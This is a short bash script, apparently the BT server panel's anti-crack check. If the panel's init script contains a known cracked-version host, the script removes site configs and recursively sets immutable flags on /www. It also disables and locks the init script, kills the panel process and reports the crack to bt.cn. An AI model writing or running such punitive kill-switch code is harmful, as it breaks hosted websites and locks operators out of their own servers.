#!/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
bt_lock(){
	mkdir -p /www/backup/panel/
	mv /www/server/panel/vhost /www/backup/panel/
	mkdir -p /www/server/panel/vhost
	chattr -R +ia /www
	chmod -x /etc/init.d/bt
	chattr +ia /etc/init.d/bt 
	BT_PID=$(ps aux|grep 'runserver:app'|grep -v grep|awk '{print $2}')
	kill -9 ${BT_PID}
	curl -Ss --connect-timeout 3 http://www.bt.cn/api/panel/to_pjs
	echo "True" > /etc/bt_crack.pl
	exit 1;
}

init_check(){
	CRACK_URL=(oss.yuewux.com);
	for url in ${CRACK_URL[@]};
	do
		CRACK_INIT=$(cat /etc/init.d/bt |grep ${url})
		if [ "${CRACK_INIT}" ];then
			bt_lock
		fi
	done
}
init_check
